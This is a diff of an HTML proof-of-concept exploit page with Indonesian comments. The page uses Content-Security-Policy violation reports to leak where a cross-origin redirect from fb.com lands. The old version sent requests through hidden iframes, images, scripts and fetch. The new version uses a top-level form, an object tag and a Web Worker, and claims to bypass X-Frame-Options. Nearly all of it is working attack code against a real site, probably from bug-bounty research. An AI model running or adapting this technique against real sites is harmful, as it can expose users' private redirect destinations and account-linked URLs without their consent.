@@ -4,99 +4,76 @@
     <meta charset="UTF-8">
     <meta http-equiv="Content-Security-Policy" content="
         default-src 'self' 'unsafe-inline'; 
-        frame-src https://fb.com; 
-        img-src https://fb.com; 
-        script-src 'unsafe-inline' 'self' https://fb.com; 
         form-action https://fb.com; 
-        connect-src 'self' https://fb.com;
+        object-src https://fb.com; 
+        worker-src https://fb.com;
     ">
-    <title>Ultimate CSP Redirect Leak PoC</title>
+    <title>No-Iframe CSP Leak</title>
     <style>
-        body { background-color: #121212; color: #e0e0e0; font-family: monospace; padding: 20px; }
-        h2 { color: #00ffcc; }
-        button { background-color: #ff4444; color: white; border: none; padding: 12px 24px; font-size: 16px; font-weight: bold; cursor: pointer; border-radius: 4px; }
-        button:hover { background-color: #cc0000; }
-        .log-box { background-color: #1e1e1e; border: 1px solid #333; padding: 15px; margin-top: 15px; border-radius: 5px; overflow-x: auto; }
-        .trigger-title { color: #f39c12; font-weight: bold; font-size: 1.1em; margin-bottom: 10px; display: inline-block; border-bottom: 1px solid #f39c12; }
-        .leak-highlight { color: #ff4444; font-weight: bold; }
-        #hiddenZone { display: none; }
+        body { background-color: #111; color: #0f0; font-family: monospace; padding: 20px; }
+        button { background: #f00; color: #fff; padding: 10px; border: none; cursor: pointer; font-weight: bold; }
+        .log { border: 1px solid #333; padding: 10px; margin-top: 10px; background: #222; word-break: break-all; }
+        .alert { color: #f00; font-weight: bold; }
     </style>
 </head>
 <body>
 
-    <h2>🔥 Ultimate CSP Redirect Leak Tester</h2>
-    <p>Target: <code>https://fb.com/4</code> -> Redirects to <code>https://www.facebook.com/4</code></p>
+    <h2>🚫 No-Iframe Leak Tester</h2>
+    <p>Membuktikan kebocoran terjadi tanpa iframe, mem-bypass proteksi X-Frame-Options (XFO).</p>
     
-    <button id="exploitBtn">Run Mass Exploit</button>
+    <button id="btnForm">Test 1: Top-Level Form Action</button>
+    <button id="btnObject">Test 2: Object Tag</button>
+    <button id="btnWorker">Test 3: Web Worker</button>
 
-    <div id="logContainer"></div>
-
-    <div id="hiddenZone">
-        <iframe name="stealthFrame"></iframe>
-    </div>
+    <div id="logs"></div>
 
     <script>
-        const targetUrl = 'https://fb.com/4';
-        const logContainer = document.getElementById('logContainer');
-        const hiddenZone = document.getElementById('hiddenZone');
+        const targetUrl = 'https://fb.com/secret-path';
+        const logs = document.getElementById('logs');
 
-        // Listener buat nangkep laporan satpam (CSP)
+        // Listener CSP
         document.addEventListener('securitypolicyviolation', e => {
-            const props = new Set('url,documentURL,blockedURL,documentURI,blockedURI,referrer,sample,sourceFile,script-sample,message,stack,reason,href,src,data,target'.split(','));
+            const isLeaking = e.blockedURI.includes('facebook.com');
+            const status = isLeaking ? '<span class="alert">[ LEAK DETECTED ]</span>' : '[ SAFE ]';
             
-            // Cari tau tag apa yang bikin error
-            const triggerTag = e.target ? e.target.tagName : 'API/Fetch';
-            const isLeaking = e.blockedURI.includes('www.facebook.com');
-            const alertText = isLeaking ? '<span class="leak-highlight">[ LEAK DETECTED ]</span>' : '[ SAFE ]';
-
-            // Bikin box buat nampilin JSON
-            const logBox = document.createElement('div');
-            logBox.className = 'log-box';
-            
-            // Header log
-            const header = document.createElement('div');
-            header.className = 'trigger-title';
-            header.innerHTML = `Component: &lt;${triggerTag}&gt; | Directive: ${e.violatedDirective} ${alertText}`;
-            
-            // JSON Dump
-            const pre = document.createElement('pre');
-            pre.style.color = "#a6e22e";
-            pre.textContent = JSON.stringify(e, [...props], 2);
-
-            logBox.appendChild(header);
-            logBox.appendChild(pre);
-            logContainer.appendChild(logBox);
+            logs.innerHTML += `
+                <div class="log">
+                    <b>Directive:</b> ${e.violatedDirective}<br>
+                    <b>Status:</b> ${status}<br>
+                    <b class="alert">Blocked URI: ${e.blockedURI}</b>
+                </div>
+            `;
+            // Cancel form submission secara visual biar halaman gak pindah beneran kalau tembus
+            e.preventDefault(); 
         });
 
-        // Eksekusi semua payload secara bersamaan
-        document.getElementById('exploitBtn').addEventListener('click', () => {
-            logContainer.innerHTML = ''; // Bersihin log lama
-            
-            // 1. Test Form Submit (Pake target stealthFrame)
+        // 1. Serangan via Form (Top Level, bukan target iframe)
+        document.getElementById('btnForm').addEventListener('click', () => {
             const form = document.createElement('form');
             form.action = targetUrl;
             form.method = 'GET';
-            form.target = 'stealthFrame'; 
-            hiddenZone.appendChild(form);
+            // Sengaja GAK PAKE target="..." biar jalan di current window (Top Level)
+            document.body.appendChild(form);
+            
+            // Ketika redirect form diblokir CSP, browser nge-abort navigasi, 
+            // jadi halaman kita gak hilang dan tetep bisa nangkep log-nya!
             form.submit();
+        });
 
-            // 2. Test Iframe
-            const iframe = document.createElement('iframe');
-            iframe.src = targetUrl;
-            hiddenZone.appendChild(iframe);
+        // 2. Serangan via Object
+        document.getElementById('btnObject').addEventListener('click', () => {
+            const obj = document.createElement('object');
+            obj.data = targetUrl;
+            document.body.appendChild(obj);
+        });
 
-            // 3. Test Image
-            const img = document.createElement('img');
-            img.src = targetUrl;
-            hiddenZone.appendChild(img);
-
-            // 4. Test Script
-            const script = document.createElement('script');
-            script.src = targetUrl;
-            hiddenZone.appendChild(script);
-
-            // 5. Test Fetch API
-            fetch(targetUrl, { mode: 'no-cors' }).catch(() => {});
+        // 3. Serangan via Worker (Latar Belakang)
+        document.getElementById('btnWorker').addEventListener('click', () => {
+            try {
+                new Worker(targetUrl);
+            } catch(err) {
+                console.log("Worker creation failed/blocked");
+            }
         });
     </script>
 
